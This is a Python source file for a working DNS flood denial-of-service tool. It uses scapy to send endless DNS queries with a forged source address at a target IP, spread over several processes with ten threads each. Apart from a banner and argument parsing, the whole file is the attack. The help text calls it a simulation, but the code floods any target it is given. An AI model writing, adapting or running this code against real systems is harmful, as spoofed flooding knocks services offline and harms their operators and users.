from scapy.all import *
from multiprocessing import Process
import threading
import time
import argparse
import sys
import socket
import random
from colorama import init, Fore, Style

# Inisialisasi colorama
init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════╗
║         DNS FLOOD ATTACK TOOL            ║
║        Created with ❤️  by Danz           ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def print_success(message):
    print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")

def print_info(message):
    print(f"{Fore.BLUE}[*] {message}{Style.RESET_ALL}")

def print_error(message):
    print(f"{Fore.RED}[!] {message}{Style.RESET_ALL}")

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def generate_random_domain():
    domains = ['example.com', 'test.com', 'sample.org', 'domain.net']
    prefixes = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
    return f"{prefixes}.{random.choice(domains)}"

def generate_random_record_type():
    record_types = [1, 2, 5, 12, 15, 16, 28]  # A, NS, CNAME, PTR, MX, TXT, AAAA
    return random.choice(record_types)

def dns_flood(target_ip, target_port, dns_server, rate_limit):
    print_info(f"Starting DNS flood on {target_ip}:{target_port}")
    packets_sent = 0

    def send_dns_query():
        nonlocal packets_sent
        while True:
            try:
                dns_query = IP(dst=target_ip, src=dns_server) / \
                           UDP(dport=target_port, sport=RandShort()) / \
                           DNS(rd=1, qd=DNSQR(qname=generate_random_domain(), qtype=generate_random_record_type()))
                send(dns_query, verbose=False)
                packets_sent += 1
                if packets_sent % 1000 == 0:
                    print_success(f"Sent {Fore.YELLOW}{packets_sent}{Fore.GREEN} packets to {target_ip}")
                time.sleep(rate_limit)
            except Exception as e:
                print_error(f"Error in DNS flood: {str(e)}")
                break

    threads = []
    for _ in range(10):  # Increase thread count for higher packet sending rate
        t = threading.Thread(target=send_dns_query)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description=f"{Fore.CYAN}Simulate DNS Resolver Misconfiguration Attack{Style.RESET_ALL}",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=53, help="Target DNS port (default: 53)")
    parser.add_argument("-d", "--dns_server", required=True, help="IP address of the fake DNS server")
    parser.add_argument("-n", "--threads", type=int, default=5, help="Number of attack threads")
    parser.add_argument("-r", "--rate", type=float, default=0.01, help="Rate limit for packet sending (seconds)")
    args = parser.parse_args()

    # Validasi input
    if not validate_ip(args.target) or not validate_ip(args.dns_server):
        print_error("Invalid IP address format")
        sys.exit(1)

    if args.port < 1 or args.port > 65535:
        print_error("Invalid port number")
        sys.exit(1)

    if args.threads < 1:
        print_error("Number of threads must be positive")
        sys.exit(1)

    processes = []
    try:
        print_info("Starting DNS flood attack...")
        print_info(f"Target: {Fore.YELLOW}{args.target}:{args.port}{Style.RESET_ALL}")
        print_info(f"DNS Server: {Fore.YELLOW}{args.dns_server}{Style.RESET_ALL}")
        print_info(f"Threads: {Fore.YELLOW}{args.threads}{Style.RESET_ALL}")
        print_info(f"Rate Limit: {Fore.YELLOW}{args.rate} seconds{Style.RESET_ALL}")

        for _ in range(args.threads):
            p = Process(target=dns_flood, args=(args.target, args.port, args.dns_server, args.rate))
            p.start()
            processes.append(p)

        for p in processes:
            p.join()

    except KeyboardInterrupt:
        print("\n")
        print_error("Attack interrupted by user. Cleaning up...")
        for p in processes:
            p.terminate()
        for p in processes:
            p.join()
        print_success("All processes terminated")
        sys.exit(0)
    except Exception as e:
        print_error(f"Error: {str(e)}")
        for p in processes:
            p.terminate()
        sys.exit(1)

if __name__ == "__main__":
    main()
